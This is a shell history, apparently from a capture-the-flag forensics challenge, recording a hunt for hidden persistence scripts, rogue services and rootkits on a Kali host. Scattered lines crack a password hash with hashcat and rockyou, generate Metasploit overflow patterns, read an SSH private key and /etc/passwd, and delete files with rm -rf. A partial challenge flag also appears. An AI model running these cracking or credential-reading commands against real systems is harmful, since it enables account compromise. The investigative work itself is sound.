+ 1091  hashcat -m 1800 -s / -a 0 wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1092  hashcat -m 1800 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1093  nano hash
+ 1094  y
+ 1095  hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
+ 1096  hashcat m 0 hash /usr/share/wordlists/rockyou.txt
+ 1097  hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
+ 1098  cat hash
+ 1099  hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt
+ 1100  find . -type f -exec grep -l "CSOCTF" {} \;
+ 1101  find . -type f  grep -l "CSOCTF" {} \;
+ 1102  find . -type f "CSOCTF" {} \;
+ 1103  find . -type f -name "flag" {} \;
+ 1104  find . -type f -name "flag"
+ 1105  find . -type f -name "flag.txt"
+ 1106  nano save.sh
+ 1107  nmap -sP 125.16.41.0/24
+ 1108  nmap -sP 135.16.41.1
+ 1111  cd .././
+ 1112  cat ~/.bashrc
+ 1113  ls /bin
+ 1115  ls bin -t
+ 1116  ls -lia /usr/bin -t
+ 1117  ls -lia /usr/lib -t
+ 1118  ls /opt/microsoft
+ 1119  ls -lia /opt/microsoft/powershell/7/ -t
+ 1120  find -name "fake"
+ 1121  find . -name "fake"
+ 1123  ls * ./run/user/137/
+ 1124  cd ./run/user/137/
+ 1126  ls gvfs
+ 1127  find . -name "fake-hwclock.data"
+ 1128  ls ./gvfsd
+ 1130  cat gvfs/fake-hwclock.data
+ 1132  which-command
+ 1133  whence
+ 1134  unalias history
+ 1136  systemctl status patch-update.timer
+ 1138  ]vi
+ 1139  vi
+ 1140  find . -type f -name "remedy"
+ 1141  find . -name "remedy"
+ 1142  history grep 
+ 1143  grep -r "remedy"
+ 1144  grep -r "remedy" >> remedy
+ 1145  head remedy
+ 1146  nano re
+ 1147  nano remedy
+ 1148  grep -r "Gabriel"
+ 1150  unalias ls
+ 1151  ls .att
+ 1153  ls ~/.att
+ 1154  ls /lib/mono/2.0-api/.aws/.att/.src
+ 1155  ls /lib/mono/2.0-api/.aws/.att/.src/
+ 1156  cd /lib/mono/2.0-api/.aws/.att/.src
+ 1157  cd /lin
+ 1158  nalias cd
+ 1159  unalias cd
+ 1160  cd /lib
+ 1161  cd mono
+ 1162  /lib/mono/2.0-api/.aws/.att/.src
+ 1163  cd 2.0-api
+ 1170  cat .patching.sh~
+ 1171  binwalk -e .bsod.jpg --run-as=root
+ 1174  file .bsod.jpg
+ 1175  exiftool .bsod.jpg
+ 1177  ls -lia ../
+ 1178  ls -lia ../../
+ 1179  msf-pattern_create -l 82
+ 1184  unalias cat
+ 1185  cat .patching.sh
+ 1186  cd /etc/systemd/
+ 1189  ls -lia *
+ 1190  cat system/patch-install.service
+ 1191  cat system/patch-install..timer
+ 1193  cat system/patch-update.service
+ 1194  cat system/patch-install.timer
+ 1195  cat system/sentinel.service
+ 1196  cd ../init/ls
+ 1197  cd ../init/
+ 1199  cat *
+ 1200  cd ../init.d
+ 1204  ls -lia ../systemd/system -t
+ 1205  cd ../systemd/syste,
+ 1206  cd ../systemd/systen
+ 1207  cd ../systemd/system
+ 1208  cat sshd.service
+ 1209  cat serial-getty@.service.d
+ 1210  cat serial-getty@.service.d/autologin.conf 
+ 1212  cat cloud-init.target.wants
+ 1213  cat cloud-init.target.wants/cloud-init-local.service
+ 1214  cat cloud-init.target.wants/cloud-config.service
+ 1216  cat ntpsec-rotate-stats.timer
+ 1217  cat ntpsec-systemd-netif.path
+ 1218  cat ntpsec.service
+ 1219  cat network-pre.target.wants
+ 1220  cat network-pre.target.wants/ntpsec-systemd-netif.path
+ 1221  cat ntpsec.timer
+ 1222  cat remote-fs.target.wants
+ 1223  cat remote-fs.target.wants/nfs-client.target 
+ 1225  cat syslog.service 
+ 1226  cat getty.target.wants
+ 1227  cat getty.target.wants/getty@tty1.service 
+ 1229  ls rc.d
+ 1230  ls rc.local
+ 1231  ls rc0.d
+ 1232  ls -lia rc.0 -t
+ 1233  ls -lia rc0.d -t
+ 1234  cat ../init.d/redsocks
+ 1236  lls -lia -t
+ 1237  ls -lia -t
+ 1238  ls lost+found
+ 1239  ls -lia * -t
+ 1242  ls -lia 0 -t
+ 1243  ls -lia bin -t
+ 1244  ls -lia binls -lia dev -t -t
+ 1246  ls -lia etc -t
+ 1248  ls -lia home -t
+ 1249  ls -lia lib -t
+ 1250  ls -lia lost+found -t
+ 1251  ls -lia media
+ 1252  ls -lia mnt
+ 1254  ls -lia opt -t
+ 1255  ls -lia proc -t
+ 1257  ls -lia -t --time-tyle="%Y-%m-%d" | grep "$(date +"%Y-%m-%d")"
+ 1258  ls -lia * -t --time-tyle="%Y-%m-%d" | grep "$(date +"%Y-%m-%d")"
+ 1259  ls -lia * -t --time-style="%Y-%m-%d" | grep "$(date +"%Y-%m-%d")"
+ 1260  ls -lia * -t --time-style=+"%Y-%m-%d" | grep "$(date +"%Y-%m-%d")"
+ 1261  rkhunter
+ 1262  rkhunter --check
+ 1265  cat /var/log/rkhunter.log
+ 1266  nano /var/log/rk
+ 1267  nano /var/log/rkhunter.log
+ 1268  ls /dev/proc
+ 1269  ossec
+ 1270  clamav
+ 1272  sysctl net.ipv4.conf.all.send_redirects
+ 1275  cat /etc/cron.d*
+ 1276  cat /etc/cron.*
+ 1277  ls /etc/cron.*
+ 1278  cat /etc/cron.hourly/fake-hwclock
+ 1279  docker
+ 1280  docker images
+ 1281  docker container ls
+ 1283  cat Downloads/diginotar-root-ca.pem
+ 1286  ls /etc/systemd/system
+ 1287  cd /etc/systemd/system
+ 1288  cat sentinel.service
+ 1289  find / -type f -executable -mtime -1 -print
+ 1290  ls /run/user/137
+ 1291  sudo ls /run/user/137
+ 1293  cat /root/.cache/pocl/kcache/HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/l_markov/0-0-0/l_markov.so
+ 1294  cat /root/.cache/pocl/kcache/OP/LCBNDPHMPBPHGDMEIIKNPGJFMKHJIBDLOOHLO/m07400_comp/0-0-0/m07400_comp.so
+ 1295  cd /root/.cache/pocl/kcache/OP/
+ 1299  cat tempfile_1Xz02
+ 1300  cat tempfile_1Xhx02
+ 1301  sudo find / -type f -executable -mtime -1 -print
+ 1302  ls -lia HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF
+ 1303  cat HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/last_accessed
+ 1304  cat HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/program.bc
+ 1305  strings HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/program.bc
+ 1306  strings HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/*
+ 1307  strings HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/l_markov/4096-1-1-goffs0-smallgrid/l_markov.s
+ 1308  strings HD/GMCFHPEMBECCPNNEPKJAMPCMIGOCNPMIDGOOF/l_markov/4096-1-1-goffs0-smallgrid/l_markov.so
+ 1309  ls /proc/
+ 1310  ls /proc/274387
+ 1311  ls /proc/1/2
+ 1312  ls /proc/274611
+ 1313  ls /proc/274611/task/274611
+ 1314  ls /proc/274611/task/274611/
+ 1315  ls /proc/274611/task/274611/fdinfo/
+ 1316  ls /proc/274611/task/274611/fdinfo/0
+ 1317  cat /proc/274611/task/274611/fdinfo/0
+ 1320  grep -r "cowsay" 
+ 1321  grep -r "matrix" 
+ 1322  grep -r "matrix" | grep -vE "last_updated"
+ 1323  grep -r "matrix"  | cut -c1-50
+ 1326  grep -r "patching.sh"  | cut -c1-50
+ 1327  cat .viminfo
+ 1328  cat ~/Desktop/hello.txt
+ 1329  ls /home
+ 1330  cat /home/kali/Desktop/hello.txt
+ 1331  cat /home/ssm-user/Desktop/hello.txt
+ 1332  nano .viminfo
+ 1333  ls /etc/rc.local
+ 1334  cat /etc/rc.local
+ 1335  cat /etc/boot.d
+ 1336  grp -r ".testing.sh"
+ 1338  grep -r ".testing.sh"
+ 1339  grep -r ".testing.sh"  | grep -vE " denied"
+ 1340  grep -r ".testing.sh"  | grep -vE "Permission denied"
+ 1341  grep -r ".testing.sh"  2>/dev/null
+ 1342  grep -r ^.*\sh$ 2>/dev/null
+ 1343  grep -r -E "^.*\sh$" 2>/dev/null
+ 1344  cd root
+ 1345  grep /root -r -E "^.*\sh$" 2>/dev/null
+ 1346  grep /ome -r -E "^.*\sh$" 2>/dev/null
+ 1347  grep /home -r -E "^.*\sh$" 2>/dev/null
+ 1350  grep . -r -E "^.*\sh$" 2>/dev/null
+ 1351  grep -r -E "^.*\sh$" /root 2>/dev/null
+ 1352  grep -r -E "^.*\sh$" /home 2>/dev/null
+ 1353  ls ../
+ 1354  grep -r -E "^.*\sh$" /tmp 2>/dev/null
+ 1355  grep -r -E "^.*\sh$" /usr 2>/dev/null
+ 1356  grep -r -E "^.*\sh$" /usr --exclude-dir=/usr/share 2>/dev/null
+ 1361  ls /usr/sbin/cron
+ 1362  chkrootkit
+ 1365  ping 10.0.0..222
+ 1366  ping 10.0.0.222
+ 1367  ls /var/www/
+ 1368  cat /home/kali/.bashrc
+ 1369  cat /root/.profile
+ 1371  /usr/bin/sentinelctl
+ 1372  /usr/bin/sentinelctl --help
+ 1373  cat /usr/lib/mono/2.0-api/fonts/.italics/.testing.sh
+ 1374  ls /usr/lib/mono/2.0-api/fonts/.italics/.testing.sh
+ 1375  ls /usr/lib/mono/2.0-api/fonts/.italics/
+ 1376  ls -lia /usr/lib/mono/2.0-api/fonts/
+ 1377  ls -lia /usr/lib/mono/2.0-api/
+ 1378  ls ./ghidra
+ 1379  ls -lia ~/.ghidra
+ 1380  cat ~/.ghidra/.meow.sh
+ 1381  cat ~/.Desktop/hello.txt
+ 1384  grep -r "hello.txt"
+ 1385  ls -lia ~/.Desktop
+ 1386  ls -lia ~/Desktop
+ 1387  ls /tmp/
+ 1388  cat /tmp/tmux-0
+ 1389  ls -lia /tmp/tmux-0
+ 1390  cat /etc/unicornscan/ports.txt
+ 1391  md5sum /bin/ls
+ 1392  md5sum /usr/bin/login
+ 1393  strings /usr/bin/login
+ 1395  history | grep msfvenom
+ 1396  fo i in {1..100}; do echo "$(printf "%0.sX" {1..100}) >> output.txt; done
+ 1397  for i in {1..100}; do echo "$(printf "%0.sX" {1..100}) >> output.txt; done
+ 1398  for i in {1..100}; do echo "$(printf "%0.sX" {1..100})" >> output.txt; done
+ 1399  /usr/share/met
+ 1400  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+ 1401  history 100
+ 1402  sudo find / -type f -executable -mtime -7 -print
+ 1403  cat /etc/systemd/sentiel.service
+ 1404  cat /etc/systemd/system/sentinel.service
+ 1405  cat /usr/lib/mono/2.0-api/.aws/.att/.patching.sh
+ 1406  netstat -ant
+ 1407  cat /var/log/auth.log
+ 1408  cat /tmp/shrndom32r2r\n
+ 1409  cat /var/log/auth.log | grep -vE "pam_unix"
+ 1410  ls /var/log/
+ 1411  ls -lia /var/log
+ 1412  ss
+ 1413  sudo ss 0tunp | grep -v 'ESTAB'
+ 1414  sudo ss -tunp | grep -v 'ESTAB'
+ 1415  cat ~/.ssh
+ 1416  ls ~/.ssh
+ 1417  ls ~/.ssh/id_rsa
+ 1418  ls ~/.ssh/authorized_keys
+ 1419  cat ~/.au
+ 1420  cat ~/.ssh/authorized_keys
+ 1421  ssh red_kali
+ 1422  ssh ms1784@10.0.2.171
+ 1423  cat ~/.ssh/id_rsa
+ 1424  systemctl list-unit-files
+ 1425  systemctl list-unit-files | grep 'enabled'
+ 1426  systemctl list-unit-files | grep 'enabled' | less
+ 1427  cat /etc/systemd/system/regenerate-ssh-host-keys.service
+ 1428  history | grep sentinel
+ 1429  history 1000 | grep sentinel
+ 1430  /usr/bin/sentinelctl stop
+ 1431  /usr/bin/sentinelctl version
+ 1432  /bin/sentinelctl version
+ 1433  /opt/sentinelone/bin/sentinelctl version
+ 1434  ls /opt/sentinelone/bin/
+ 1435  sha256sum /usr/bin/sentinelctl
+ 1436  sha256 /bin/sentinelctl
+ 1437  sha256sum /bin/sentinelctl
+ 1438  md5sum /usr/bin/sentinelctl
+ 1439  sudo /usr/bin/sentinelctl version
+ 1440  ps -ef | grep sentinel
+ 1441  ps -ef | grep "sentinel
+ 1442  ps -ef | grep "sentinel"
+ 1443  cat /etc/passwd
+ 1444  cat /etc/passwd | grep sentinel
+ 1445  top
+ 1446  watch -n 2 "ps aux >> log"
+ 1451  watch -n 2 "ps aux >> log2"
+ 1452  find . -name "linpeas"
+ 1453  history 1000 | grep "linpeas"
+ 1454  find .- type f -name "linpeas"
+ 1455  linpeas
+ 1458  ls /etc/apparmor.d/abstractions/fonts
+ 1459  cat /etc/apparmor.d/abstractions/fonts
+ 1460  cat log | grep "alias"
+ 1461  cat log | grep "scp"
+ 1462  cat log | grep "xcopy"
+ 1463  cat log2 | grep "alias"
+ 1464  tail log2
+ 1465  tail f log2
+ 1466  tail -f log2
+ 1467  ls /var/log
+ 1468  lias
+ 1469  alias
+ 1470  cat log2 | grep "python"
+ 1471  cat log2 | grep "Python"
+ 1472  cat log2 | grep "print"
+ 1474  cat /usr/share/system-config-printer/applet.py
+ 1475  grep -r "" 2>\dev\null | cut -c1-100 | grep -v "xplico" | grep -v "Teeth" | grep -v "kernel"
+ 1476  cat /etc/hostname
+ 1477  cat /etc/source
+ 1478  cat /etc/sources
+ 1479  ls /etc/sou
+ 1480  ls /etc/s*
+ 1481  ls /etc/apt
+ 1482  cat /etc/apt/sources.list
+ 1483  unhide
+ 1485  sudo unhide brute
+ 1486  sudo unhide b
+ 1487  quick
+ 1488  sudo unhide wuick
+ 1489  sudo unhide quick
+ 1490  sudo unhide checkgetsched
+ 1491  galleta
+ 1492  sudo unhide checknoprocps
+ 1493  sudo unhide checkchdir
+ 1495  lsof -i -n -P | grep ESTABLISHED | awk '!seen[\$1,\$2,\$5,\$9]++ {print}'
+ 1496  watch -n 5"lsof -i -n -P | grep ESTABLISHED | awk '1,\$2,\$5,\$9]++ {print}' >> test.txt"
+ 1497  watch -n 5  "lsof -i -n -P | grep ESTABLISHED | awk '1,\$2,\$5,\$9]++ {print}' >> test.txt"
+ 1498  watch -n 2 lasof -i -n -P
+ 1499  watch -n 2 lsof -i -n -P
+ 1500  cat --containerd=/run/containerd/containerd.sock
+ 1502  cat /run/containerd/containerd.sock
+ 1503  systemctl status containerd
+ 1504  journalctl -u containerd
+ 1505  qdocker info \ grep containerd
+ 1506  docker info | grep containerd
+ 1507  docker ps
+ 1508  ls /root/.cache/gvfs 
+ 1509  cat /root/.cache/gvfs 
+ 1510  ls /root/.cache/gvfs/
+ 1511  cat log2 | grep "python3"
+ 1512  cat log2 | grep patching.sh"
+ 1513  cat log2 | grep "patching.sh"
+ 1514  cat log2 | grep "\.sh"
+ 1515  cat log2 | grep ".sh"
+ 1516  grep -r "[ C"
+ 1517  grep -r '\['
+ 1518  grep -r "\[" 2>/dev/null
+ 1519  grep -r "\[" 2>\dev\null
+ 1520  grep -r "\[ C" 2>\dev\null
+ 1521  grep -r "\[ C $" 2>\dev\null
+ 1522  grep -r "a l i a s" 2>\dev\null
+ 1523  grep -r "matrix" 2>\dev\null
+ 1524  grep -r "matrix" 2>\dev\null | cut 1-40
+ 1525  history | grep cut
+ 1526  history 10000 | grep cut
+ 1527  history 2000 | grep cut
+ 1528  history 1000 | grep cut
+ 1529  grep -r "matrix" 2>\dev\null | cut -c1-50
+ 1531  grep -r "bWF0cml4" 2>\dev\null | cut -c1-50
+ 1532  grep -r "matrix" 2>\dev\null | cut -c1-100
+ 1533  grep -r "alias" 2>\dev\null | cut -c1-100
+ 1534  grep -r "alias" 2>\dev\null | cut -c1-100 | grep -v "xplico"
+ 1535  grep -r "alias" 2>\dev\null | cut -c1-100 | grep -v "xplico" | grep -v "Teeth" | grep -v "kernel"
+ 1536  grep -r "cowsay" 2>\dev\null | cut -c1-100 | grep -v "xplico" | grep -v "Teeth" | grep -v "kernel"
+ 1537  ssdeep
+ 1538  grep -r "xdotool" 2>\dev\null | cut -c1-100 | grep -v "xplico" | grep -v "Teeth" | grep -v "kernel"
+ 1539  history | grep lynis
+ 1540  lynics
+ 1541  lynis
+ 1542  lynis audit system
+ 1543  cat /var/log/lynis.log | grep "login"
+ 1545  history 1000
+ 1546  cat /var/log/lynis.log | grep "sha256"
+ 1550  tail -f log
+ 1551  nano log
+ 1552  nano capture.sh
+ 1553  chmod +x capture.sh
+ 1555  python3 capture.sh
+ 1556  python capture.sh
+ 1558  ./capture.sh
+ 1559  ./capture.sh/bin/bash
+ 1560  /bin/bash
+ 1561  cat log | grep "patching.sh"
+ 1562  cat log | grep ".sh"
+ 1563  tail log
+ 1564  unalias -a
+ 1565  cat log | head
+ 1566  cat log| less
+ 1567  ssdeep /usr/bin/login
+ 1568  grep -r "xdotool" 2>\dev\null | cut -c1-100
+ 1569  sudo unhide checkprov
+ 1570  sudo unhide checkproc
+ 1571  sudo unhide checksysinfo
+ 1572  ps --no-header -eL o lwp
+ 1573  ps aux | grep -v "^USER" | grep -v "^root" | grep -v "^TTY" |  grep -v "^ps" | grep -v "^pts" | grep -v "TIME" | grep -v "COMMAND"
+ 1574  ps aux | grep -v "^USER" | grep -v "^root" | grep -v "TTY" |  grep -v "ps" | grep -v "pts" | grep -v "TIME" | grep -v "COMMAND"
+ 1575  /lib/systemd/systemd --user
+ 1576  sudo unhide
+ 1577  sudo unhide proc
+ 1578  sudo unhide sys
+ 1579  sudo procs
+ 1580  sudo unhide procs
+ 1581  sudo unhide procfs
+ 1582  systemctl start apparmor
+ 1583  systemctl status apparmor
+ 1584  grep -r "export " 2>\dev\null | cut -c1-100
+ 1586  ls Desktop
+ 1587  ls Music
+ 1588  ls Desktop/malware.zip
+ 1590  cd Desktop
+ 1591  strings malware.zip
+ 1592  strings malware.zip | grep "flag"
+ 1593  strings malware.zip | grep "flag.txt"
+ 1594  strings malware.zip | grep "\[ C"
+ 1596  strings malware.zip | grep "\[CSOCTF_ty1ng_2_r3ach_u"
+ 1597  ls -lia Desktop/malware.zip
+ 1598  ls -lia 
+ 1600  pv
+ 1601  unzip malware.zip
+ 1602  ls -lia --time-style=long-iso
+ 1603  dd -hf
+ 1604  df
+ 1605  df /dev/xvda1
+ 1606  df /dev/xvda1/
+ 1607  ls -lia --time-style=long-iso /dev/
+ 1608  strings malware.zip | grep "\[CSO"
+ 1609  strings malware.zip | grep "matrix"
+ 1610  strings /dev/xvda1
+ 1611  ls /rooot/.local/
+ 1612  ls /root/.local/
+ 1613  ls /root/.local/share
+ 1614  ls /root/.local/share/Trash
+ 1615  ls /root/.local/share/Trashf
+ 1616  ls /root/.local/share/Trash/files
+ 1617  ls /root/.local/share/Trash/expunged
+ 1618  ls /root/.local/share/Trash/info
+ 1619  ls /home/kali/.local/share/Trash/expunged
+ 1621  cat log | grep "touch"
+ 1622  strings /dev/xvda1 | grep ".patching.sh"
+ 1623  grep -A 3 -B 3 ".patching.sh" /dev/xvda1
+ 1624  less -n /dev/xvda1
+ 1625  less -f -n /dev/xvda1
+ 1626  grep -r -A 3 -B 3 ".patching.sh" /dev/xvda1
+ 1628  cd /dev/xvda1
+ 1629  dec /boot/efi
+ 1630  dc /boot/efi
+ 1631  cd /boot/efi
+ 1633  cd EFI
+ 1635  ls *
+ 1636  cd ../../../
+ 1637  mount | grep /dev/xvda1
+ 1638  sudo blkid /dev/xvda1
+ 1639  grep /dev/xda1 /etc/mtab
+ 1640  sudo mdir /mnt/test
+ 1643  ls root/D
+ 1645  rm -rf root/Desktop/malware.zip
+ 1646  sudo mkdir /mnt/test
+ 1647  sudo mount /dev/xvda1 /mnt/test
+ 1648  cd /mnt/test
+ 1650  cd /root/Desktop
+ 1654  cat .local/share/
+ 1656  ls /mnt
+ 1657  ls /mnt/efs/
+ 1658  pwd
+ 1660  cd /run
+ 1663  cd /mnt
+ 1665  cd test
+ 1667  ls root/Desktop
+ 1668  ls -lia root/Desktop
+ 1669  ls /mnt/test/root/Desktop
+ 1670  ls -lia /mnt/test/root/Desktop
+ 1671  ls -lia /mnt/test/lib/mono/2.0-api/.aws/.att
+ 1672  cat /mnt/test/lib/mono/2.0-api/.aws/.att/.patching.sh
+ 1673  stat /mnt/test/lib/mono/2.0-api/.aws/.att/.patching.sh
+ 1674  stat /usr/bin/dpkg
+ 1675  strings /usr/bin/dpkg
+ 1676  dpkg --audit
+ 1677  debsums
+ 1678  cat /var/log/dpkg.log
+ 1679  cat /var/log/dpkg.log.1
+ 1681  cd ../../
+ 1682  cd root/Desktop/s
+ 1683  cd root/Desktop/
+ 1684  rm -rf xvda
+ 1687  ls /dev/smm
+ 1688  ls /dev/shm
+ 1691  cd ../
+ 1693  rm fuzzults
+ 1694  rm ffufresults
+ 1695  rm devnull
+ 1696  df ih
+ 1697  df 0h
+ 1700  ls -lia
+ 1701  cat remedy
+ 1702  rm -rf remedy
+ 1703  ls .local/share/trash
+ 1704  ls .local/share/Trash
+ 1705  rm -rf .local/share/Trash/*
+ 1706  df -h
+ 1707  history grep
+ 1708  grep -r -A 3 -B 3 ".patching.sh" /var/log/sys*
+ 1713  grep -r -A 10 -B 10 "patch-install" /var/log/sys*
+ 1715  grep -r -A 10 -B 10 "sentinel" /var/log/sys*
+ 1716  clear
+ 1717  grep -r -A 10 -B 10 ".patching.sh" /var/log/sys*
+ 1718  mousepad
+ 1720  ls -lis 
+ 1721  cat ~/.viminfo
+ 1722  cat ~/.viminfo | grep "hello"
+ 1723  netstat -anbo
+ 1724  strings /usr/local/bin/netstat
+ 1725  strings /usr/local/bin/netstat | grep "\["
+ 1727  radare2
+ 1728  radare2 -i /usr/local/bin/netstat
+ 1729  gdb /usr/local/bin/netstat
+ 1730  r2 /usr/local/bin/netstat
+ 1731  ls
+ 1732  ghidra test /usr/local/bin/netstat -decompile -process
+ 1733  ghidra test /usr/local/bin/netstat -decompile
+ 1734  history
+ 1735  mousepad history
